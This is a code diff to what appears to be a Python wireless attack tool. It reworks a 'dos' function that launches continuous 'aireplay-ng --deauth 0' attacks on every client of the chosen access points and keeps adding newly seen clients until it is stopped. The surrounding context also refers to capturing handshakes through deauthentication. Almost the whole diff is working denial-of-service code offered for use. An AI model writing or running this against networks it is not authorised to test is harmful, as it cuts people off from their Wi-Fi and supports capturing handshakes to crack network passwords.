@@ -136,31 +136,27 @@ def handshake_active(networks: list, interface: str, deauth_count: int = 10, wai
         os.system("pkill -f 'airodump-ng'")
         os.system("rm -f *.cap")
 
-def dos(networks: list, interface: str, attack_time: int = 0):
-    targets = get_targets(networks, interface) 
-    
+def dos(networks: list, interface: str, attack_time: int = 0):    
     if not confirm(f"Are you shure want to attack {len(networks)} targets?"):
         print("[!] Attack canceled")
         return
-
-    processes = []
-    print("[!] Ctrl+C to stop attack")
-    for target in targets:
-        print(f"[+] Starting attack {target['ESSID']}...")
-        for client in target["clients"]:
-            command = f"aireplay-ng --deauth 0 -a {target['BSSID']} -c {client['Station MAC']} -D {interface} > /dev/null"
-            process = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE)        
-            process.stdin.close()
-            processes.append(process)
     
+    print("[!] Ctrl+C to stop attack")
+
     try:
-        if attack_time == 0:
-            while True:
-                time.sleep(1)
-        else:
-            time.sleep(attack_time)
-            print("[!] Attack Ended")
+        start_time = time.time()
+        attacked_clients = []
+        while attack_time == 0 or time.time() - start_time < attack_time:
+            for network in networks:
+                clients = check_clients(network, interface)
+                for client in clients:
+                    if not client['Station MAC'] in attacked_clients:
+                        print(f"[+] Starting attack client {client['Station MAC']} on AP {network['ESSID']}...")
+                        command = f"aireplay-ng --deauth 0 -a {network['BSSID']} -c {client['Station MAC']} -D {interface} > /dev/null"
+                        subprocess.Popen(command, shell=True, stdin=subprocess.PIPE)
+                        attacked_clients.append(client['Station MAC'])
+        print("\n[!] Attack ended")
     except KeyboardInterrupt:
         print("\n[!] Interrupted")
-    
+
     os.system("pkill -f 'aireplay-ng --deauth'")
